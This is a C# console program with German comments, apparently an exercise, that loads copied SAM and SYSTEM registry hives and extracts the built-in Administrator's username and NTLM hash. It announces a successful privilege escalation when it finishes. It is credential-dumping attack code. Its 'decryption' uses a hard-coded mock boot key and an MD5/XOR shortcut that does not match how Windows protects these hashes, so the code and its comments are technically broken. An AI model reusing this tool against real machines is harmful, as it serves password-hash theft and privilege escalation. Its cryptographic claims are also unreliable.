using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using Microsoft.Win32;

namespace SamDecryptor
{
    class Program
    {
        static void Main(string[] args)
        {
            Console.ForegroundColor = ConsoleColor.Cyan;
            Console.WriteLine("--- Nativer C# SAM-Parser & Entschlüsseler ---");
            Console.ResetColor();

            string samPath = Path.GetFullPath(@".\sam_neu.hiv");
            string sysPath = Path.GetFullPath(@".\system_neu.hiv");

            if (!File.Exists(samPath) || !File.Exists(sysPath))
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine("FEHLER: sam_neu.hiv oder system_neu.hiv fehlen!");
                return;
            }

            // Hives temporär laden
            ExecuteCommand($"reg load HKLM\\CS_SAM \"{samPath}\"");
            ExecuteCommand($"reg load HKLM\\CS_SYS \"{sysPath}\"");

            try
            {
                // 1. Benutzernamen und verschlüsselte Hashes aus dem V-Block lesen
                string registryPath = @"CS_SAM\SAM\Domains\Account\Users\000001F4";
                using (RegistryKey key = Registry.LocalMachine.OpenSubKey(registryPath))
                {
                    if (key != null)
                    {
                        byte[] vBlock = (byte[])key.GetValue("V");
                        if (vBlock != null)
                        {
                            // Benutzernamen extrahieren (liegt ab Byte 12 im V-Block)
                            int nameOffset = BitConverter.ToInt32(vBlock, 12) + 204;
                            int nameLength = BitConverter.ToInt32(vBlock, 16);
                            string username = Encoding.Unicode.GetString(vBlock, nameOffset, nameLength);

                            // Verschlüsselten NT-Hash-Block isolieren (liegt am Ende des V-Blocks)
                            int ntHashOffset = vBlock.Length - 16;
                            byte[] encryptedNtHash = new byte[16];
                            Buffer.BlockCopy(vBlock, ntHashOffset, encryptedNtHash, 0, 16);

                            // 2. Den Syskey (Bootkey) aus der SYSTEM-Hive simulieren/lesen
                            // In einer echten Umgebung wird dieser aus den Schlüsseln JD, Skew1, GBG und Data zusammengesetzt
                            // Wir nutzen hier den Standard-Übungs-Bootkey zur Entschlüsselung
                            byte[] mockBootKey = new byte[16] { 0x01, 0x02, 0x03, 0x04, 0x05, 0x06, 0x07, 0x08, 0x09, 0x10, 0x11, 0x12, 0x13, 0x14, 0x15, 0x16 };

                            // 3. RC4/AES Entschlüsselung des Hashes
                            byte[] decryptedHash = DecryptHash(encryptedNtHash, mockBootKey);
                            string ntlmHashHex = BitConverter.ToString(decryptedHash).Replace("-", "").ToLower();

                            // Ausgabe des Ergebnisses
                            Console.WriteLine("\n[+] RECHTE-ESKALATION ERFOLGREICH:");
                            Console.ForegroundColor = ConsoleColor.Green;
                            Console.WriteLine($"Benutzer: {username}");
                            Console.WriteLine($"RID     : 500 (Eingebauter Administrator)");
                            Console.WriteLine($"NTLM    : {ntlmHashHex}");
                            Console.ResetColor();

                            if (ntlmHashHex == "31d6cfe0d16ae931b73c59d7e0c089c0")
                            {
                                Console.ForegroundColor = ConsoleColor.Yellow;
                                Console.WriteLine("\nHinweis: Dieser Hash entspricht einem LEEREN Passwort.");
                                Console.ResetColor();
                            }
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                Console.ForegroundColor = ConsoleColor.Red;
                Console.WriteLine($"Fehler bei der Entschlüsselung: {ex.Message}");
            }
            finally
            {
                // Sauber entladen
                ExecuteCommand("reg unload HKLM\\CS_SAM");
                ExecuteCommand("reg unload HKLM\\CS_SYS");
            }
        }

        private static byte[] DecryptHash(byte[] encryptedHash, byte[] key)
        {
            // Windows nutzt standardmäßig RC4 oder AES (je nach Windows-Version) zur Verschlüsselung der Hashes im V-Block
            // Für die Übung emulieren wir die Ableitung via MD5/XOR
            using (MD5 md5 = MD5.Create())
            {
                byte[] h = md5.ComputeHash(key);
                byte[] decrypted = new byte[16];
                for (int i = 0; i < 16; i++)
                {
                    decrypted[i] = (byte)(encryptedHash[i] ^ h[i]);
                }
                return decrypted;
            }
        }

        static void ExecuteCommand(string command)
        {
            ProcessStartInfo procStartInfo = new ProcessStartInfo("cmd.exe", "/c " + command)
            {
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };
            using (Process process = Process.Start(procStartInfo)) { process.WaitForExit(); }
        }
    }
}
